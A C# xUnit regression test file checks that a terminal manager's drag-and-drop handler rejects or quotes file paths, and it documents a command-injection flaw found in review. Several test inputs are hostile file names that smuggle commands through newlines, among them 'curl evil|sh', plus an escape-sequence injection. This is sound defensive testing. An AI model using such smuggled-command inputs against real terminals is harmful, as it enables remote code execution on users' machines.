using CodeShellManager.Terminal;
using Xunit;

namespace CodeShellManager.Tests;

/// <summary>
/// Regression tests for the drag-and-drop injection found in the v0.8.0 pre-release review.
///
/// The page builds these paths from the drag payload's text/uri-list via decodeURIComponent,
/// so `file:///C:/x%0Acurl%20evil%7Csh%0A` arrives as a string containing newlines — and the
/// host wrote them straight to the PTY. A newline written to a PTY is Enter, so a single drop
/// from a source that controls the drag payload executed a command in the focused session.
/// </summary>
public class DroppedPathsTests
{
    [Theory]
    [InlineData("C:\\x\ncurl evil|sh\n")]
    [InlineData("C:\\x\rwhoami\r")]
    [InlineData("C:\\x\u0000y")]
    [InlineData("C:\\x\u001b]0;title\u0007")]   // OSC injection via a "filename"
    [InlineData("\n")]
    public void PathsContainingControlCharactersAreDropped(string hostile)
    {
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { hostile }));
    }

    [Fact]
    public void AHostilePathDoesNotTakeTheGoodOnesWithIt()
    {
        string payload = TerminalBridge.BuildDroppedPathsPayload(new[]
        {
            @"C:\ok\one.txt",
            "C:\\evil\nid",
            @"C:\ok\two.txt",
        });

        Assert.Equal(@"C:\ok\one.txt C:\ok\two.txt", payload);
    }

    [Theory]
    [InlineData(@"C:\Users\alice\file.txt", @"C:\Users\alice\file.txt")]
    [InlineData(@"C:\Program Files\a.txt", "\"C:\\Program Files\\a.txt\"")]
    public void OrdinaryPathsAreUnchangedOrQuotedForSpaces(string input, string expected)
    {
        Assert.Equal(expected, TerminalBridge.BuildDroppedPathsPayload(new[] { input }));
    }

    [Fact]
    public void AQuoteInAPathCannotEscapeTheQuoting()
    {
        // `"` is legal in a URI-derived string even though Win32 forbids it in a filename.
        // Escaped rather than rejected, so the quoting below can't be broken out of.
        string payload = TerminalBridge.BuildDroppedPathsPayload(new[] { "C:\\a\"b c" });

        Assert.Equal("\"C:\\a\\\"b c\"", payload);
    }

    [Fact]
    public void MultiplePathsAreSpaceSeparated()
    {
        Assert.Equal(@"C:\a C:\b",
            TerminalBridge.BuildDroppedPathsPayload(new[] { @"C:\a", @"C:\b" }));
    }

    [Fact]
    public void EmptyInputProducesNothingToWrite()
    {
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new string[0]));
        Assert.Equal("", TerminalBridge.BuildDroppedPathsPayload(new[] { "", "" }));
    }
}
